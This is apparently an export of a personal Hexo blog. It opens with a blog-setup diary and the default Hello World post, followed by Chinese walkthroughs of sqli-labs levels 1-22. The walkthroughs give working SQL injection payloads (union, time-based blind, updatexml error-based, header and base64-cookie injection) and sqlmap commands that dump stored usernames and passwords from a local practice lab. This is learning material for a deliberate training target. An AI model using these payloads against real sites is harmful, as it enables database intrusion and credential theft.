<li><strong>git与GitHub连接</strong>。由于我自己的大意以及参考文章的不严谨导致第一天晚上多熬了一个多小时的夜。</li>
<li><strong>安装node.js和Hexo</strong>。先是更改nodejs的配置环境，从C盘到D盘。这步倒还好，顺利进行了。但随之而来的Hexo的安装就惨了。因为前面nodejs的配置不是通常情况，参考文章也偶尔出错，导致我不断报错。而每次报错我又到网上查原因，再根据其它文章打补丁。一来二去，问题没解决，头却大了。就这个问题，让我在电脑前像僵尸一样坐了三个多小时，最后气得我把nodejs和hexo及其相关文件全卸载，所有网页全关了。之后重新下载，在网上随便找了篇文章。竟然奇迹般十分钟就解决了（应该说本来就只该花这点时间吗&#x2F;(ㄒoㄒ)&#x2F;~~）</li>
<li><strong>美化网页</strong>。完全是大意了，本以为网站都搭好了，应该不会出现什么问题了，于是在网上东找一点西找一点，未曾想落入了大意的圈套。这个圈套就是“分享”。不知道看了谁的文章，稀里糊涂下载了分享模块，结果出现了无论如何也无法消灭的高危漏洞。这便是噩梦的开始，恶魔的降临，恶意的迸发。心力憔悴地折腾了四个小时后，我最终不甘心地向现实低头–卸载所有内容，网站从零开始。</li>
</ol>
<h1 id="经验教训"><a href="#经验教训" class="headerlink" title="经验教训"></a>经验教训</h1><ul>
<li>最好找<strong>2年</strong>以内的文章。太久远的由于时效性往往会导致不兼容或是其它错误。</li>
<li>最好看那些<em>评论数多或是点赞多</em>的文章。以便能够顺利搭建，即便不能也可以看看和自己有类似情况或是已经解决问题的人。</li>
<li><em>多对比慎操作</em>。不要看到一篇文章怎么写就马上实操，尽量多搜几篇文章看看他们的处理方案，从中选优。毕竟试错成本可能会很高。</li>
<li>自己操作的时候要<em>看清楚</em>。多花两分钟看，总比多花两小时排错好。</li>
<li>保持<em>耐心</em>。实在厌烦排错的时候不妨重装。</li>
<li>网站不要放到<em>社交平台</em>上。容易被盯上网站被黑。（等我啥时候安全技术强了就不怕了,,ԾㅂԾ,,）</li>
</ul>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ol>
<li>这篇文章是我搭建博客的开始，虽然有些问题，不过不影响我对它的感谢。<br><a href="https://zhuanlan.zhihu.com/p/102592286">从零开始搭建个人博客</a></li>
<li>虽然是在2017年写就的文章，过了5年到如今仍然适用。也是这篇文章把我从第2个挫折点的痛苦旋涡中解救出来。<br><a href="https://www.jianshu.com/p/3f2fe426edff">在Windows环境下使用hexo搭建博客</a></li>
<li>在我优化博客的时候有许多优质文章提供了帮助。</li>
</ol>
<p><a href="https://kumarinko.gitee.io/2022/01/01/Build_hexo-next_Blog/">hexo-next博客搭建</a></p>
<p><a href="https://blog.csdn.net/as480133937/article/details/100138838">Hexo-Next 主题博客个性化配置超详细，超全面</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1952241">hexo插件篇</a></p>
<p><a href="https://blog.csdn.net/qnhnt/article/details/126330886">Hexo-NexT v8.x字数统计以及阅读时间配置</a></p>
]]></content>
      <categories>
        <category>随想</category>
      </categories>
      <tags>
        <tag>随想</tag>
        <tag>搭建博客</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2022/11/03/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<span id="more"></span>

<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs_11+12</title>
    <url>/2022/11/10/sqli-labs_11+12/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本关开始，使用POST提交方式，但只是换了种提交方式，模式和前面的GET还是差不多。</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>猜解方式和之前差不多。这里稍微使用点和之前不一样的方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or 1=1 #   万能密码构造成功，返回账户和密码</span><br></pre></td></tr></table></figure>
<p>说明：这里的注释要使用#，之前的--+不再适用</p>
</li>
<li><p>猜解SQL查询语句中的<strong>字段数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 2 #   返回正确信息</span><br><span class="line">1&#x27; order by 3 #   返回错误信息</span><br></pre></td></tr></table></figure>
<p>说明字段数为2</p>
</li>
<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select database(),version() #   返回Your Login name:security  Your Password:5.7.26</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; #</span><br><span class="line">返回emails,referers,uagents,users</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; #</span><br><span class="line">返回id,username,password</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(username,&#x27;:&#x27;,password) from users #  返回用户名和密码</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第12关和第11关差不多，只是要用1”-or-1-x3D-1"><a href="#第12关和第11关差不多，只是要用1”-or-1-x3D-1" class="headerlink" title="第12关和第11关差不多，只是要用1”) or 1&#x3D;1 #"></a>第12关和第11关差不多，只是要用1”) or 1&#x3D;1 #</h2><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>如果前面掌握了，这关没有难度</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入之sqli-labs_1+2</title>
    <url>/2022/11/07/sqli-labs_1+2/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>直接做题很痛苦，看不懂也没有基础。去补了一节课才明白很多原理。</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1’后是否有<strong>报错提示</strong></li>
</ol>
<ul>
<li>有提示。则存在SQL注入</li>
<li>无提示。不存在SQL注入<br>（说明：有提示即代表输入的数据带入到了数据库中查询，因此存在注入）<br>只有存在SQL注入才能继续往下执行。<br><img src="/simg/sqli-labs_1.png" alt="sqli-labs_1"></li>
</ul>
<ol start="2">
<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>方法是：<br>首先输入：<br> ?id&#x3D;1 and 1&#x3D;2  或  ?id&#x3D;1’–+<br>由于之前我们已经输入过 ?id&#x3D;1’ 出现报错，<br>如果本次输入再次出现报错，说明是 数字型<br>否则即为 字符型</p>
</li>
<li><p>猜解SQL查询语句中的<strong>字段数</strong><br>为什么要猜解字段数？<br>因为我们已知存在SQL注入且其类型，可以使用联合查询注入。要使用联合注入首先得知道字段数。<br>（说明：联合查询Union:是把2个sql语句一起查询结果合并，且两张表需要有相同的列数和字段名，使用方式示例如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> A <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> B</span><br></pre></td></tr></table></figure>
<p>）<br>字段数可以通过order by语句得知。原理是通过order by语句查询，显示正常时是查询列数小于等于总列数。如果报错则该查询列数超过总列数。由此可得知字段数。示例语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;order by 3--+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆出显示位</strong><br>所谓爆出显示位，意思是查看分析哪些列是在页面显示的，这有利于我们后续的分析操作。<br>因此我们可以通过如下语句查询：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,3--+</span><br></pre></td></tr></table></figure>
<p>（说明：id&#x3D;-1的原因是为了让查询结果完全是union右边的值）</p>
</li>
<li><p>获取当前<strong>数据库名和数据库版本号</strong><br>获取数据库名可以执行一些后续操作，获取版本号可以判断哪些数据库操作能做哪些不能做。<br><a href="https://blog.csdn.net/weixin_34678198/article/details/113273999">MYSQL版本简单区别</a><br>因此我们可以通过如下语句查询：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,database(),version()--+</span><br></pre></td></tr></table></figure>
<p>这里用到了mysql的系统函数，下面列举5个常用mysql注入系统函数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">version()   		  MySQL版本</span><br><span class="line">user()     			  数据库用户名</span><br><span class="line">database() 			  数据库名</span><br><span class="line">@@datadir  			  数据库路径</span><br><span class="line">@@version_compile_os  操作系统版本</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong><br>首先需要介绍数据库默认库information_schema（5.0以上版本有该库）中的重要表</p>
</li>
</ol>
<ul>
<li><p>information_schema.schemata<br>schemata表中重要字段为schema_name，此字段涵盖数据库存在的所有库名字，我们可以通过查询语句得知我们想要的数据库都有哪些（database()只可得知当前数据库）<br>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(schema_name),3 from information_schema,schemata</span><br></pre></td></tr></table></figure>
<p>（说明：group_concat()的作用是将所有结果连接显示成一行）</p>
</li>
<li><p>information_schema.tables<br>tables表中重要字段为table_schema（库名）和table_name（表名）。可通过查询语句得到库名或表名，但由于table_schema与表字段table_name一一对应，有大量重复内容。只爆库建议使用schemata库查询<br>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(table_schema),group_concat(table_name) from information_schema.tables--+</span><br></pre></td></tr></table></figure>
<p>通过此方法可单独爆出某个数据库内的表名，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema like 0x646F75706870--+</span><br></pre></td></tr></table></figure>
<p>说明：通过匹配库爆表，需要将库名转换成哈希值或二进制，否则有时候会被转义从而报错</p>
</li>
<li><p>information_schema.columns<br>columns表中存在三个重要字段，分别为table_schema（库名字段）、table_name（表名字段）、column_name（字段）<br>可以直接利用这个表对数据库进行爆库爆表操作，只是仍然有很多重复字段，并不建议这么做。</p>
</li>
</ul>
<p>在本关中具体语句即为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>

<ol start="7">
<li><p><strong>爆字段名</strong><br>通过sql语句查询知道当前数据库有4个表，根据表名知道可能用户的账号和密码是在users表中。因此接下来即为得到该表的字段名和内容。<br>示例语句为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure>
<p>说明：该语句查询information_schema数据库下的columns表的table_name字段。注意table_name字段在tables表和columns表中均存在。表示所有字段对应的表名。</p>
</li>
<li><p><strong>爆数据</strong><br>通过上述操作可知敏感字段username和password，接下来即查询该字段对应的内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(username,id,password) from users--+</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="sqlmap方式"><a href="#sqlmap方式" class="headerlink" title="sqlmap方式"></a>sqlmap方式</h2><p>下面步骤：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py --purge   清缓存</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-1/?id=1&quot; --dbs   爆库</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-1/?id=1&quot; -D database() --tables   爆表</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-1/?id=1&quot; -D database() -T users --columns   爆字段</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-1/?id=1&quot; -D database() -T users -C &quot;id,username,password&quot; --dump  爆数据</span><br></pre></td></tr></table></figure>
<p>其余详参我的博客：sqlmap使用</p>
<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul>
<li>此笔记为笔者初学sql注入时所写</li>
<li>以上示例主要是第一关，第一关和第二关差别只在字符型和数字型</li>
</ul>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
<p><a href="https://blog.csdn.net/weixin_48421613/article/details/107488560">关于sql注入暴库爆表爆字段</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_13+14+15+16</title>
    <url>/2022/11/10/sqli-labs_13-16/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>知识都是前面已经出现过的，只是提交方式不同，没什么难度。</p>
<span id="more"></span>

<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol>
<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) #  登录成功，但没有回显</span><br></pre></td></tr></table></figure>
<p>构造成功，然后使用时间盲注</p>
</li>
<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(length(database())&gt;7,sleep(10),1) #         判断数据库名长度</span><br><span class="line">admin&#x27;) and if(ascii(substring(database(),1,1))=115,sleep(10),1) #   判断数据库名第一个字符</span><br></pre></td></tr></table></figure>
<p>以此类推</p>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(10),1); #     判断表名</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substring((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))=101,sleep(10),1); #     判断字段名</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substr((select username from security.users order by id limit 0,1),1,1))=68,sleep(10),1); #</span><br><span class="line">判断数据</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第14关差不多，只是构造方式变成了双引号"><a href="#第14关差不多，只是构造方式变成了双引号" class="headerlink" title="第14关差不多，只是构造方式变成了双引号"></a>第14关差不多，只是构造方式变成了双引号</h2><h2 id="第15关和第11关差不多"><a href="#第15关和第11关差不多" class="headerlink" title="第15关和第11关差不多"></a>第15关和第11关差不多</h2><h2 id="第16关和第12关差不多"><a href="#第16关和第12关差不多" class="headerlink" title="第16关和第12关差不多"></a>第16关和第12关差不多</h2><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>有手就行</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_17</title>
    <url>/2022/11/11/sqli-labs_17/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本关开始有了新变化，是一个更新密码的页面，这说明已经成功进入了系统，接下来就看看如何解决吧。</p>
<span id="more"></span>

<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol>
<li>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>如果不知道源码，去一遍遍尝试，会发现无论是布尔盲注还是时间盲注都无法得到预期结果，因此我们可以采用报错注入。<br>首先，那我们可以从源码中发现，有一个过滤函数check_input，其过滤步骤是：</li>
</ol>
<ul>
<li><code>substr($value,0,15)</code>截断到15位</li>
<li>单引号，双引号，反斜杠，null自动使用反斜杠转义</li>
<li>stripslashes()去掉多余的反斜杠<br>然后，passwd没有使用过滤函数过滤，因而可以进行注入。由此可使用报错注入。</li>
</ul>
<ol start="2">
<li><p>获取当前<strong>数据库名和数据库版本号</strong><br>第一个用户名填写：admin<br>第二个密码填写所需的报错注入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123&#x27; and (updatexml(1,concat(0x5c,version(),0x5c),1))#     爆版本</span><br><span class="line">123&#x27; and (updatexml(1,concat(0x5c,database(),0x5c),1))#    爆数据库</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123&#x27; and (updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c),1))#      爆表名</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123&#x27; and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name =&#x27;users&#x27;),0x5c),1))#    爆字段名</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27; and updatexml(1,concat(0x7e,(select username from (select username from users limit 0,1)test),0x7e),1) #  爆用户</span><br><span class="line">admin&#x27; and updatexml(1,concat(0x7e,(select username from (select username from users where username=&#x27;admin&#x27; limit 0,1)test),0x7e),1) #      爆密码</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>本关的重点在于找到注入方式，如何去通过报错注入获取所需信息。技术上仍然还是那些。也可参见第二篇致谢的其它报错函数注入。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a><br><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a><br><a href="https://cloud.tencent.com/developer/article/1906116">全网最全sqli-labs通关攻略</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_18</title>
    <url>/2022/11/15/sqli-labs_18/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在这一关的时候出了bug，没有报错。查了半天原因，最终猜测是数据库版本的问题，让人实在难受，最终只得重新删除sqli-labs再次下载。在这里郑重警示自己，不要使用MySQL5.7.26及以上的数据库。</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型<br>首先username和password输入admin<br>发现返回如下情况：<br><img src="/simg/sqli-labs_18.png" alt="返回情况"><br>返回了ip和user-agent的识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等<br>我们通过源码的check_input可以得知，username和passwd都被过滤了。所以我们不能使用在POST处注入手段。<br>继续检查源码，可以发现这条语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">insert</span><span class="operator">=</span>&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br></pre></td></tr></table></figure>
<p>因此我们可以从user-agent处注入。</p>
</li>
<li><p>通过burp抓包注入<br>burp的下载安装配置这里暂且不提，默认已弄好。<br>注意，如果是第一次抓包，会无法抓到，因为浏览器默认是不会抓127.0.0.1的包，需要自己设置。<br>打开Firefox，搜索about:config。<br>然后在访问后的搜索框内搜索 network.proxy.allow_hijacking_localhost，将值改为true</p>
</li>
</ol>
<p>另外还有一种方法，是将127改为自己的内网网址192.168.x.x<br>但这个方法我没成功，所以暂时搁置。</p>
<p>输入正确的用户名和密码后，在burp抓包，把user-agent的值改为我们需要注入的内容。如下图所示：<br><img src="/simg/sqli-labs_18_3.png" alt=" "></p>
<ol start="3">
<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select database()),0x7e),1) or&#x27;</span><br><span class="line">&#x27;or updatexml(1,concat(0x7e,(select version()),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or (updatexml(1,concat(0x7e,(SELECT concat_ws(&#x27;:&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1),0x7e),1)) or &#x27; </span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>从本关开始，不再局限于提交方式了</p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_19</title>
    <url>/2022/11/15/sqli-labs_19/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本关的思路和前一关的思路是类似的，只不过稍微作了点变化。</p>
<span id="more"></span>

<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol>
<li><p>测试并判断注入类型<br>首先username和password输入admin<br>发现返回如下情况：<br><img src="/simg/sqli-labs_19.png" alt="返回情况"><br>返回了Referer<br>Referer是HTTP头的一个字段，用于告诉服务器该网页是从哪个页面链接过来的<br>这一次，我们在Referer的字段注入。</p>
</li>
<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select database()),0x7e),1) or&#x27;</span><br><span class="line">&#x27;or updatexml(1,concat(0x7e,(select version()),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or (updatexml(1,concat(0x7e,(SELECT concat_ws(&#x27;:&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1),0x7e),1)) or &#x27; </span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>思路一致，so easy~</p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_21+22</title>
    <url>/2022/11/15/sqli-labs_21+22/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关开始用到加解密了</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型<br>通过输入admin，可以得到如下界面：<br><img src="/simg/sqli-labs_21.png" alt="返回情况"><br>通过观察，发现cookie变成了：uname &#x3D; YWRtaW4<br>有经验后可以判断出是经过了base64加密，于是我们用解密工具，可以解出值为：admin<br>接下来判断注入类型，开启burp抓包，把base64加密后的’修改到cookie，如下所示：<br><img src="/simg/sqli-labs_21_2.png" alt=" "><br>得到报错信息，可知注入方式为 ‘)</p>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) union select 1,database(),version() #</span><br><span class="line">JykgdW5pb24gc2VsZWN0IDEsZGF0YWJhc2UoKSx2ZXJzaW9uKCkgIw==</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; #</span><br><span class="line">JykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT0nc2VjdXJpdHknICM=</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; #</span><br><span class="line">JykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0ndXNlcnMnICM=</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) union select 1,2,group_concat(username,&#x27;:&#x27;,password) from users #</span><br><span class="line">JykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodXNlcm5hbWUsJzonLHBhc3N3b3JkKSBmcm9tIHVzZXJzICM=</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第22关"><a href="#第22关" class="headerlink" title="第22关"></a>第22关</h2><p>和第21关差不多，只不过注入方式是 “<br>修改一下就可以用了</p>
